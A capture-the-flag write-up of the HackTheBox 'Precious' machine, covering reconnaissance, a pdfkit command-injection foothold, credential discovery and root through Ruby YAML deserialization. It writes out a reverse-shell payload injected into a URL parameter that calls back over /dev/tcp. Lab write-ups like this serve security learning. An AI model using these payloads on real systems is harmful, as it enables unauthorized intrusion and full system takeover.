# Precious.HTB-Write-Up
Write up report for the HackTheBox machine Precious.

- Initiated a service/network scan on the given HTB box with Nmap. `nmap -sV -sC 10.129.230.167`

![image](https://user-images.githubusercontent.com/61332852/226741000-fcc9a064-ab49-4ce5-b1c7-599783669d39.png)

- Nmap shows that a HTTP (80) Port was open and an SSH(22) port as well. I first checked to see if there was any exploits pertaining to the services of the HTTP server that was hosting the website and as well as the SSH service running. I used the command `searchsploit` and as well searched online to double check that the results searchsploit was returning was accurate.  

![image](https://user-images.githubusercontent.com/61332852/226740976-4e384403-8a3c-449f-8d98-7ab3502cd02a.png)

- After seeing there was no obvious exploits to take advantage of the next step was browsing the website running. First, I added the IP to /etc/hosts file. ` sudo nano /etc/hosts`

![image](https://user-images.githubusercontent.com/61332852/226740953-33301fed-5077-4204-aff5-9fbfd3a83eae.png)

- The website consisted of an input box that took a URL as input and the website would output that URL as a PDF File. I began running `gobuster` to see if there was anything other than what was given on the home page but returned no results of any other directories on the web server.  

![image](https://user-images.githubusercontent.com/61332852/226740925-41ed2196-dbb3-4d3b-a063-233ef46a8e13.png)

- After messing with the input box, I opened `BurpSuite` to see what the application was doing when inputting a URL. After inputting a couple different random websites, the application was returning nothing but a `Cannot load remote URL` message. Thus, I began to start my own python webserver on my localhost. `python3 -m http.server 80` 

![image](https://user-images.githubusercontent.com/61332852/226740896-3202f3d1-b47a-4f9e-8117-0f0c217e4f1e.png)


- After inputting the local python server that I had started it returned the contents within the file directory of my local http server. 

![image](https://user-images.githubusercontent.com/61332852/226740853-a1c57683-8fb2-483e-8bca-a3e264a86980.png)


- I used `exiftool` to see if there was any information I can get out of behind the PDF file that was downloaded from the website. Which gave us the software that was converting the URL to PDF. 

![image](https://user-images.githubusercontent.com/61332852/226740809-c954f88b-2ff4-4ebf-8e44-76b046e60c3d.png)


- I used the `searchsploit` command again here to see if there was anything it would find for `pdfkit v0.8.6` which was the software that running. It returned nothing as well so I went to google search to see if there were any vulnerabilities with the software running. I then found that it was vulnerable to `command injection` a type of injection vulnerability.    

![image](https://user-images.githubusercontent.com/61332852/226740759-38fc8f1e-892f-49a6-96ad-04a76634b2d9.png)

![image](https://user-images.githubusercontent.com/61332852/226740727-bff72795-dd8c-4bd1-bff6-dcc95c7f39c9.png)


- Reading more of the vulnerability and what we can start to do to exploit it this is what I found. `An application could be vulnerable if it tries to render a URL that contains query string parameters with user input`. After using this information, we can modify the URL to take a command as input to see if the application will run the command.  

![image](https://user-images.githubusercontent.com/61332852/226740697-2984f0f2-9f60-4f85-84b6-c1b6e17ba5a2.png)


- After grabbing a reverse shell command, I inserted it as a string within the URL ``http://10.10.14.66:8910/?name=#{'%20`bash -c 'exec bash -I &>/dev/tcp/10.10.14.66/4444 <&1'`'}``. Thus, getting me in as the user `Ruby` within the webserver.  

![image](https://user-images.githubusercontent.com/61332852/226740672-1a0d640a-d265-405c-9ac4-222767bf2c83.png)


- Going through all the files and directories that were given I first went to the users home folder to see if the user flag was there but didn’t consist of anything at first. I then used `ls -la`. I found something I don’t see usually which was a directory called `.bundle` which I then found a config file consisting of another user’s (`henry`) password.  

![image](https://user-images.githubusercontent.com/61332852/226740627-a73b6eb5-1b58-4f75-bd75-8007c9b786a7.png)


- I began to login as the user `henry` with the given password. Successfully getting us in. I first checked Henrys home directory to check for any flags shown there. Then giving us our first flag.  

![image](https://user-images.githubusercontent.com/61332852/226740558-376fd648-f49f-4b4e-9178-3101bf0f6624.png)


- To start privilege escalation towards getting the root flag I first checked what permissions Henry had as root on the machine.  

![image](https://user-images.githubusercontent.com/61332852/226740520-89c38d0b-3576-4309-8ad1-8cc8f64ed2c7.png)


- After checking the file, I then researched if there were any vulnerabilities with the Yaml file that was given. Then later finding that the Yaml file was vulnerable to a `Yaml Deserialization Attack` allowing us to run arbitrary code within the yaml file. We can now go look for an exploit to run in the dependency file to execute. After looking for the Ruby Yaml Exploit code we found the code to run from a GitHub Host. We then created a file within our home folder `touch dependency.yml` to paste the following code into. 

![image](https://user-images.githubusercontent.com/61332852/226740486-7756d9bd-6784-4f46-8d05-637d97f856dc.png)


- After running `sudo /usr/bin/ruby /opt/update_dependencies.rb` we can now run `/bin/bash -p` to see if we spawn as the root user. Which is successful.

![image](https://user-images.githubusercontent.com/61332852/226740410-daf082a6-98f7-4105-9f1a-395e1e9791b1.png)


- After going into roots home folder we find the root flag for the machine.

![image](https://user-images.githubusercontent.com/61332852/226740263-29e5447a-2cfb-4340-89f5-185a30987b89.png)
 
